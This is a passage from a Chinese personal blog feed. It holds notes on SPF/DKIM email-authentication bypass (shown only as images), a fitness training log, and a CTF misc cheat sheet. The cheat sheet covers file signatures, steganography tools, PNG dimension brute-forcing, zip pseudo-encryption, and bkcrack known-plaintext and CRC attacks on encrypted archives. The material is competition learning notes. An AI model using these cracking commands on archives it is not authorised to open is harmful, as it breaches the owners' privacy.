href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/RMunbmJG5o06lsx4MhfcUmfinmd.png"></p><p>SPF 显然有其局限性，当用户 A 发邮件给 B，B 再转发给 C 的时候，SPF 将邮件的发件人转换为 B，这个时候就产生了 DKIM 技术</p><h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/NJ2Ib4fFqok4wXxSXEVcipkcnEe.png"></p><p>利用了公开密钥提供了身份验证和数字签名功能防止伪造篡改。</p><h4 id="查看方式-1"><a href="#查看方式-1" class="headerlink" title="查看方式"></a>查看方式</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/YyCIbMQQEoMKQfxXRl0cT7Kcnyd.png"></p><h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/AQVWbiG1YoPy1AxHXyxcBE0snJf.png"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/MUISbyRGeoUEZBxa0TLc7HKOnkc.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>健身</title>
    <link href="/2024/09/16/%E5%81%A5%E8%BA%AB/"/>
    <url>/2024/09/16/%E5%81%A5%E8%BA%AB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>主要摘录b站大佬德意</p></blockquote><h1 id="疲劳管理"><a href="#疲劳管理" class="headerlink" title="疲劳管理"></a>疲劳管理</h1><p>疲劳类型：肌肉，神经，骨骼肌腱等</p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703000502406.png" alt="image-20240703000502406"></p><p>休息日：主要缓解心理疲劳，恢复糖原</p><p>每个小周期</p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703000725929.png" alt="image-20240703000725929"></p><p>轻训：不积累疲劳，恢复糖原并且维持成果，低容量相对高强度</p><p>小周期末尾</p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703000848833.png" alt="image-20240703000848833"></p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703000820249.png" alt="image-20240703000820249"></p><p>减载：恢复神经疲劳</p><p>放在中周期末尾，持续一到两个小周期</p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703001046819.png" alt="image-20240703001046819"></p><p>主动休息：全体恢复</p><p>一年安排一两次</p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703001153740.png" alt="image-20240703001153740"></p><h1 id="周期管理"><a href="#周期管理" class="headerlink" title="周期管理"></a>周期管理</h1><p>容量，代谢压力，力量作为目标放入一个中周期内</p><p>募集-动作模式-耐力-力量-容量</p><p>容量-力量-容量-力量-代谢压力</p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240703001301310.png" alt="image-20240703001301310"></p><p>界定MRV</p><p><img src="/" alt="img"></p><p> <img src="/" alt="img"></p><p>各个周期选择</p><p><img src="/" alt="img"></p><p><img src="/" alt="img"></p><p><img src="/" alt="img"></p><h1 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h1><img src="image-20240704215330653.png" alt="image-20240704215330653" style="zoom:150%;" /><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240704215454198.png" alt="image-20240704215454198"></p><p><img src="/2024/09/16/%E5%81%A5%E8%BA%AB/image-20240704215541152.png" alt="image-20240704215541152"></p><h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>2024.7.3</p><p>70kg</p><p>硬拉 160 3*3 第三组起不来第二个</p><p>卧推 80 5*5无压力   三个月前 100第二个起不来</p><p>深蹲 100 5*5 </p><p>2024.9.15</p><p>63kg</p><p>停练两个月</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>misc</title>
    <link href="/2024/09/16/misc/"/>
    <url>/2024/09/16/misc/</url>
    
    <content type="html"><![CDATA[<h1 id="文件头尾"><a href="#文件头尾" class="headerlink" title="文件头尾"></a>文件头尾</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs dns">.zip的文件头：<span class="hljs-number">50</span> <span class="hljs-number">4</span>B <span class="hljs-number">03 04 14 00</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span><br>.rar的文件头：<span class="hljs-number">52 61 72 21</span><br>.rar的文件尾：C4 <span class="hljs-number">3</span>D <span class="hljs-number">7</span>B <span class="hljs-number">00 40 07 00</span><br>.<span class="hljs-number">7</span>z的文件头：<span class="hljs-number">37</span> <span class="hljs-number">7</span><span class="hljs-keyword">A</span> BC AF <span class="hljs-number">27</span> <span class="hljs-number">1</span>C<br>.pyc的文件头：<span class="hljs-number">03</span> F3 <span class="hljs-number">0</span>D <span class="hljs-number">0</span><span class="hljs-keyword">A</span><br>.jpg的文件头：FF D8 FF E0 <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span><span class="hljs-keyword">A</span> <span class="hljs-number">46 49 46 00</span> <span class="hljs-number">01</span><br>.png的文件头：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">0d</span> <span class="hljs-number">0</span>a <span class="hljs-number">1</span>a <span class="hljs-number">0</span>a   文件尾：<span class="hljs-number">49</span> <span class="hljs-number">45</span> <span class="hljs-number">4</span>E <span class="hljs-number">44</span> AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br>.gif的文件头：<span class="hljs-number">47 49 46 38</span> <span class="hljs-number">39</span> <span class="hljs-number">61</span>（GIF89A）或 <span class="hljs-number">47 49 46 38</span> <span class="hljs-number">37</span> <span class="hljs-number">61</span>（GIF87A）<br>.gif的文件尾：<span class="hljs-number">00</span> <span class="hljs-number">3</span>B<br>.gz的文件头：<span class="hljs-number">1</span>F <span class="hljs-number">8</span>B <span class="hljs-number">08</span> <span class="hljs-number">00</span><br>.pyc的文件头：<span class="hljs-number">03</span> F3 <span class="hljs-number">0</span>D <span class="hljs-number">0</span><span class="hljs-keyword">A</span><br>.psd的文件头：<span class="hljs-number">38 42 50 53</span><br>TIFF (tif)，文件头：<span class="hljs-number">49492A00</span><br>Windows [Bitmap](https://so.csdn.net/so/search?q=Bitmap&amp;spm=<span class="hljs-number">1001.2101</span>.<span class="hljs-number">3001.7020</span>) (bmp)，文件头：<span class="hljs-number">424</span>D<br>CAD (dwg)，文件头：<span class="hljs-number">41433130</span><br>Adobe Photoshop (psd)，文件头：<span class="hljs-number">38425053</span><br>Rich Text Format (rtf)，文件头：<span class="hljs-number">7</span>B<span class="hljs-number">5C727466</span><br>XML (xml)，文件头：<span class="hljs-number">3</span>C3F786D6C<br>HTML (html)，文件头：<span class="hljs-number">68746</span>D6C3E<br>Email [thorough only] (eml)，文件头：<span class="hljs-number">44656</span>C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：<span class="hljs-number">2142444</span>E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：<span class="hljs-number">5374616</span>E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript (eps.or.ps)，文件头：<span class="hljs-number">252150532</span>D<span class="hljs-number">41646F6265</span><br>Adobe Acrobat (pdf)，文件头：<span class="hljs-number">255044462</span>D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E<span class="hljs-number">3828596</span><br>Wave (wav)，文件头：<span class="hljs-number">57415645</span><br>AVI (avi)，文件头：<span class="hljs-number">41564920</span><br>Real Audio (ram)，文件头：<span class="hljs-number">2</span>E7261FD<br>Real Media (rm)，文件头：<span class="hljs-number">2E524D46</span><br>MPEG (mpg)，文件头：<span class="hljs-number">000001</span>BA<br>MPEG (mpg)，文件头：<span class="hljs-number">000001B3</span><br>Quicktime (mov)，文件头：<span class="hljs-number">6D6F6F76</span><br>Windows Media (asf)，文件头：<span class="hljs-number">3026</span>B2758E66CF11<br>MIDI (mid)，文件头：<span class="hljs-number">4D546864</span><br>M4a，文件头：<span class="hljs-number">00000018667479704</span>D3441<br>！！<span class="hljs-number">1</span>.PNG文件的前<span class="hljs-number">16</span>字节是已知的：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span><span class="hljs-keyword">A</span> <span class="hljs-number">1</span><span class="hljs-keyword">A</span> <span class="hljs-number">0</span><span class="hljs-keyword">A</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>D <span class="hljs-number">49 48 44 52</span><br><br></code></pre></td></tr></table></figure><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p>隐写一把梭</p><p><a href="https://github.com/JamesHoi/PuzzleSolver/releases/tag/v1.0.1-beta">GitHub</a><a href="https://aperisolve.fr/">Aperi’Solve (aperisolve.fr)</a></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>steghide：通过密码隐藏信息</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">steghide <span class="hljs-keyword">extract </span>-sf test.<span class="hljs-keyword">jpg </span>-p <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>stegseek：配套上面工具，爆破密码</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">stegseek</span> 文件 字典<br></code></pre></td></tr></table></figure><p>Stegdetect：针对jpg隐写，支持outguess，jsteg，jphide，invisible</p><p>F5-steganography-master</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#有密码的情况</span><br>java Extract beautiful.jpg -p passwd<br><span class="hljs-comment">#无密码的情况</span><br>java Extract beautiful.jpg<br><span class="hljs-comment">#解密出来的数据会放到F5文件夹下的output.txt中</span><br></code></pre></td></tr></table></figure><p>outtguess</p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>zsteg：图片lsb快速分析</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">zsteg -<span class="hljs-selector-tag">a</span> 图片名<br><br>zsteg -e 通道 图片名<br></code></pre></td></tr></table></figure><p>cloacked-pixel：可加密的lsb</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 lsb<span class="hljs-selector-class">.py</span> analyse 路径<br>python2 lsb<span class="hljs-selector-class">.py</span> extract 路径 out 密码<br>（python lsb<span class="hljs-selector-class">.py</span> extract -<span class="hljs-selector-tag">i</span> <span class="hljs-string">&quot;路径&quot;</span> -o out<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> 密码）<br></code></pre></td></tr></table></figure><p>盲水印</p><p>爆破宽高</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import binascii<br>import struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<span class="hljs-selector-class">.read</span>()    #打开图片<br>crc32frombp = <span class="hljs-built_in">int</span>(crcbp<span class="hljs-selector-attr">[29:33]</span><span class="hljs-selector-class">.hex</span>(),<span class="hljs-number">16</span>)     #读取图片中的CRC校验值<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(crc32frombp)</span></span><br> <br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):                        #宽度<span class="hljs-number">1</span>-<span class="hljs-number">4000</span>进行枚举<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):                    #高度<span class="hljs-number">1</span>-<span class="hljs-number">4000</span>进行枚举<br>        data = crcbp<span class="hljs-selector-attr">[12:16]</span> + \<br>            struct<span class="hljs-selector-class">.pack</span>(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct<span class="hljs-selector-class">.pack</span>(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp<span class="hljs-selector-attr">[24:29]</span><br>        crc32 = binascii<span class="hljs-selector-class">.crc32</span>(data) &amp; <span class="hljs-number">0</span>xffffffff<br>        <span class="hljs-selector-id">#print</span>(crc32)<br>        <span class="hljs-built_in">if</span>(crc32 == crc32frombp):            #计算当图片大小为<span class="hljs-selector-tag">i</span>:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定<br>            <span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span>, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>IDAT块隐写：010提取数据后解压</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> binascii<br>IDAT = <span class="hljs-string">&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;</span>.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>result = binascii.hexlify(zlib.decompress(IDAT))<br><span class="hljs-built_in">print</span> (result.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">len</span>(result.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>IDTAchunk:010或者tweakpng分析IDAT块，提取异常的加上文件头尾后爆破crc</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">identify -<span class="hljs-keyword">format</span> <span class="hljs-string">&quot;%s %T \n&quot;</span> flag.gif<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">montage flag*.png -tile x1 -geometry +<span class="hljs-number">0</span>+<span class="hljs-number">0</span> flag.png     #合并图片<br>`.tile`：用于指定拼接的布局，格式为 `rowsxcolumns`。例如，`-tile <span class="hljs-number">2</span>x3` 表示将图像分成 <span class="hljs-number">2</span> 行 <span class="hljs-number">3</span> 列。<br><br>`-geometry`：用于指定每个图像块的大小和位置。例如，`-geometry +<span class="hljs-number">0</span>+<span class="hljs-number">0</span>` 表示没有间隙地拼接图像。<br><br>`-gaps`：在图像之间添加间隙，例如 `-gaps <span class="hljs-number">10</span>x10`。<br></code></pre></td></tr></table></figure><h2 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h2><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs fallback">分解GIF的命令：convert glance.gif flag.png<br>水平镜像翻转图片：convert -flop reverse.jpg reversed.jpg<br>垂直镜像翻转图片：convert -flip reverse.jpg reversed.jpg<br>合成图片的命令：montage flag*.png -tile x1 -geometry +0+0 flag.png<br>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行<br>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">lsb脚本<br><span class="hljs-keyword">from</span> PIL import Image<br>width = 1532<br>height = 961<br><span class="hljs-attribute">img</span>=Image.open(&quot;41.png&quot;)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(width):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(height):<br><span class="hljs-attribute">pi</span>=img.getpixel((i,j))<br><span class="hljs-keyword">if</span>(pi[3] == 255):<br>            <span class="hljs-built_in">print</span>(1,<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(0,<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">傅里叶盲水印<br>import cv2 as cv<br>import numpy as np<br>import matplotlib<span class="hljs-selector-class">.pyplot</span> as plt<br><span class="hljs-selector-tag">img</span> = cv<span class="hljs-selector-class">.imread</span>(<span class="hljs-string">&#x27;/root/桌面/flag.jpg&#x27;</span>, <span class="hljs-number">0</span>) #直接读为灰度图像，不过此题已经是灰度图片了<br>f = np<span class="hljs-selector-class">.fft</span><span class="hljs-selector-class">.fft2</span>(img)            #做频率变换<br>fshift = np<span class="hljs-selector-class">.fft</span><span class="hljs-selector-class">.fftshift</span>(f)     #转移像素做幅度谱<br>s1 = np<span class="hljs-selector-class">.log</span>(np<span class="hljs-selector-class">.abs</span>(fshift))#取绝对值：将复数变化成实数取对数的目的为了将数据变化到<span class="hljs-number">0</span>-<span class="hljs-number">255</span><br>plt<span class="hljs-selector-class">.subplot</span>(<span class="hljs-number">121</span>)<br>plt<span class="hljs-selector-class">.imshow</span>(<span class="hljs-selector-tag">img</span>, <span class="hljs-string">&#x27;gray&#x27;</span>)<br>plt<span class="hljs-selector-class">.title</span>(<span class="hljs-string">&#x27;original&#x27;</span>)<br>plt<span class="hljs-selector-class">.subplot</span>(<span class="hljs-number">122</span>)<br>plt<span class="hljs-selector-class">.imshow</span>(s1,<span class="hljs-string">&#x27;gray&#x27;</span>)<br>plt<span class="hljs-selector-class">.title</span>(<span class="hljs-string">&#x27;center&#x27;</span>)<br>plt<span class="hljs-selector-class">.show</span>()<br></code></pre></td></tr></table></figure><h1 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">oletools：提取Microsoft office等文件的VBA宏代码<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">wbStego4open：PDF,TXT,HTM.BMP隐写<br>打开有<span class="hljs-literal">NULL</span>字符<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">snow</span>隐写：属于空格隐写的一种，还有me隐写，可以用于图片的<span class="hljs-number">16</span>进制文本<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">NtfsStreamsEditor2</span>：txt文件检查<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">DeEgger</span> <span class="hljs-title class_">Embedder</span><span class="hljs-symbol">:PDF/</span>图片隐写<br></code></pre></td></tr></table></figure><h1 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h1><p>慢扫描电视sstv：e2eSoft</p><p>NtfsStreamsEditor2</p><p>频谱图，波形图</p><p>DTMF提取：根据拨号音</p><p><a href="http://www.dialabc.com/sound/detect/">http://www.dialabc.com/sound/detect/</a></p><h2 id="wav"><a href="#wav" class="headerlink" title="wav"></a>wav</h2><p>deepsound（可以deepsound2john爆破秘钥），slenteye，openpuff</p><p>业余无线电</p><p><img src="/2024/09/16/misc/image-20240912163032590.png" alt="image-20240912163032590"></p><h2 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h2><p>MP3Stego，slenteye</p><h1 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h1><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-built_in">AVI</span><br>   │   ├── DeEggerSetup131.msi<br>   │   ├── <span class="hljs-built_in">MP4</span> QuickTime<br>   │   └── ffmpeg-latest-win32-<span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><p>mkvtool提取音频</p><p>分帧lsb隐写</p><p>分帧指定像素</p><h1 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h1><p><img src="/2024/09/16/misc/image-20240912160203960.png" alt="image-20240912160203960"></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">文件已损坏：元数据区和目录区的文件名长度<br>如果压缩文件已损坏，则尝试用winrar打开，工具-修复压缩包<br><span class="hljs-keyword">CRC</span>校验错误：元数据区和目录区的压缩方法<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">伪加密<br>zip<br>压缩源文件数据区：7<span class="hljs-string">-8</span>位表示有无加密<br><br>压缩源文件目录区：9<span class="hljs-string">-10</span>位表示是否是伪加密<br><br>一般这俩地方都是09 00的，大概率就是伪加密了(直接把第二个PK后的09改了就行)<br><br>rar<br>第24个字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">明文攻击：针对如ZipCrypto等旧版的加密算法，分为全明文和部分明文攻击，部分明文攻击针对ZipCrypto Store算法<br>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>network/<span class="hljs-number">255145</span>.html<br>部分明文需要<span class="hljs-number">8</span>+<span class="hljs-number">4</span>即<span class="hljs-number">12</span>个已知字符，其中<span class="hljs-number">8</span>个要求连续<br></code></pre></td></tr></table></figure><p><img src="/2024/09/16/misc/image-20240912163712019.png" alt="image-20240912163712019"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs maxima">首先使用-C输入zip文件 <br>-c指定zip内部文件<br>然后-o 指定偏移量 -p 内部文件的指定明文<br>最后其他偏移量用-x指定<br><br>可以使用命令echo -n <span class="hljs-string">&quot;明文&quot;</span> | xxd -r -ps &gt; <span class="hljs-number">1.</span>txt写入明文文件<br><br><span class="hljs-number">1</span>.以png文件为例，png开头恒定为<span class="hljs-number">89</span> <span class="hljs-number">50</span> 4E <span class="hljs-number">47</span> <span class="hljs-number">0D</span> <span class="hljs-number">0A</span> 1A <span class="hljs-number">0A</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0D</span> <span class="hljs-number">49</span> <span class="hljs-number">48</span> <span class="hljs-number">44</span> <span class="hljs-number">52</span><br><br><span class="hljs-built_in">time</span> brcrack -C 压缩包 -c 压缩包中的加密文件 -p 明文文件（已知加密文件的部分） -o 偏移量（也就是<span class="hljs-number">0</span>） &gt;<span class="hljs-number">1.</span><span class="hljs-built_in">log</span>&amp;tail -f <span class="hljs-number">1.</span><span class="hljs-built_in">log</span><br>.\bkcrack.exe -C secret.zip -c flag.png -p pnghead -x <span class="hljs-number">10585967</span> <span class="hljs-number">0000000049454E44AE426082</span><br><br>bkcrack -C 压缩包 -c 获取的文件 -k 上一步得到的<span class="hljs-built_in">key</span> -d 输出文件名<br><br><span class="hljs-number">2</span>.压缩包：文件名会出现在zip压缩包的文件头，偏移量为<span class="hljs-number">30</span>，所以当一个压缩包内有另一个压缩包，可以根据内部压缩包名字进行攻击，由zip文件头<span class="hljs-number">4</span>字节，内部压缩包名字≥<span class="hljs-number">8</span>字节<br><br>brcrack -C 压缩包 -c 内部压缩包名字 -p 明文文件（内部压缩包中的压缩文件名，会被写入压缩包文件头中） -o <span class="hljs-number">30</span> -x <span class="hljs-number">0</span> <span class="hljs-number">504B0304</span><br>brcrack -C 压缩包 -c 内部压缩包名字 -k 秘钥 -d 输出文件名<br><br></code></pre></td></tr></table></figure><p><img src="/2024/09/16/misc/image-20240912215228777.png" alt="image-20240912215228777"></p><p>例如以上题目 zip里面有zip，-c指定内部压缩包，-p指定的文件内容是dasflow.pcap(会出现在内部压缩包文件头内)</p><p><img src="/2024/09/16/misc/image-20240910221343374.png" alt="image-20240910221343374"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">crc爆破：大量文件&lt;=<span class="hljs-number">18</span>字节，爆破出密码<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">110206427</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">密码不可见字符：python处理<br><span class="hljs-built_in">base64</span>加密后再<span class="hljs-built_in">base64</span>解密得到bytes<br>libnum.n2s<br></code></pre></td></tr></table></figure><h1 id="加密手法"><a href="#加密手法" class="headerlink" title="加密手法"></a>加密手法</h1><p><a href="https://goodlunatic.github.io/posts/1ad9200/">CTF-Misc Guide - ⚡Lunatic BLOG⚡ (goodlunatic.github.io)</a></p><h2 id="HMAC-SHA"><a href="#HMAC-SHA" class="headerlink" title="HMAC_SHA"></a>HMAC_SHA</h2><p><img 